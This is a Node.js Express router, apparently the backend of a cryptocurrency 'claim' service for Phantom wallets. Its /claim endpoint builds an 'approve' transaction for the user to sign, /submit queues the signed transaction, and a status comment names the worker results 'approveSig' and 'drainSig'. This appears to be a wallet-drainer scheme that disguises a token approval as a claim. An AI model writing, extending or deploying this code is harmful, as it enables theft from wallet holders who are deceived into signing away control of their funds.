const express = require("express");
const router = express.Router();

const { getPool } = require("../core/rpcPool");
const { buildApprove } = require("../flows/approveFlow");
const { submitJob, getQueue } = require("../queue/jobQueue");
const logger = require("../core/logger");

// Claim endpoint
router.post("/claim", async (req, res) => {
    try {
        const { publicKey } = req.body;

        if (!publicKey) {
            return res.status(400).json({ error: "Missing publicKey" });
        }

        logger.info("Processing claim request", { publicKey });

        // Correct connection retrieval
        const connection = getPool().getConnection();

        // Build approve transaction
        const tx = await buildApprove(publicKey, connection);

        // Serialize transaction for Phantom
        const serialized = tx.serialize({
            requireAllSignatures: false,
            verifySignatures: false
        });

        const base64 = serialized.toString("base64");

        res.json({
            transaction: base64,
            message: "Approve transaction ready"
        });

    } catch (err) {
        logger.error("Claim endpoint error", { error: err.message, stack: err.stack });
        res.status(500).json({ error: err.message });
    }
});

// Submit endpoint
router.post("/submit", async (req, res) => {
    try {
        const { publicKey, signedTransaction } = req.body;

        if (!publicKey || !signedTransaction) {
            return res.status(400).json({ error: "Missing required fields" });
        }

        const jobId = await submitJob(publicKey, signedTransaction);

        res.json({
            status: "queued",
            jobId
        });

    } catch (err) {
        logger.error("Submit endpoint error", { error: err.message });
        res.status(500).json({ error: err.message });
    }
});

// Job status endpoint - returns job state and worker result (approveSig, drainSig)
router.get("/job/:id", async (req, res) => {
    try {
        const queue = getQueue();
        const jobId = req.params.id;
        const job = await queue.getJob(jobId);
        if (!job) return res.status(404).json({ error: "Job not found" });

        const state = await job.getState();
        // job.returnvalue is available after completion
        const result = job.returnvalue || null;
        const failedReason = job.failedReason || null;

        res.json({ jobId: job.id, state, result, failedReason });
    } catch (err) {
        logger.error("Job status endpoint error", { error: err.message });
        res.status(500).json({ error: err.message });
    }
});

module.exports = router;
